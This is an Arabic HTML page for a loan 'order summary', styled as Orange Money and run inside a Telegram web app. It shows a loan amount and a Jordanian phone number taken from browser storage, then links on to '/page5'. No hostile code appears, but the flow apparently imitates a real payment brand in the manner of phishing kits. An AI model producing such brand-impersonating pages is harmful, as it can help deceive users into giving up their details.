<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ملخص الطلب - أورانج موني</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #e5e5e5; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 15px; }
        .card { background: white; width: 100%; max-width: 480px; padding: 40px 30px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: right; }
        h2 { font-size: 26px; margin-bottom: 20px; color: #111; }
        p { font-size: 16px; line-height: 1.6; color: #444; border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 15px; display: flex; justify-content: space-between; }
        p span { font-weight: bold; color: #000; }
        .btn-next { background: #f16e00; color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .btn-next:hover { background: #d66100; }
    </style>
</head>
<body>
<div class="card">
    <h2>ملخص الطلب</h2>
    <p>مبلغ القرض: <span id="sumAmt">--</span></p>
    <p>رقم الهاتف: <span id="sumPhone">--</span></p>
    <button class="btn-next" onclick="submitForm()">تأكيد وإرسال الطلب</button>
</div>
<script>
    document.getElementById('sumAmt').innerText = (localStorage.getItem('loan_amount') || '1500') + " دينار";
    document.getElementById('sumPhone').innerText = "+962 " + (localStorage.getItem('phone') || '');
    function submitForm() { window.location.href = "/page5"; }
</script>
</body>
</html>
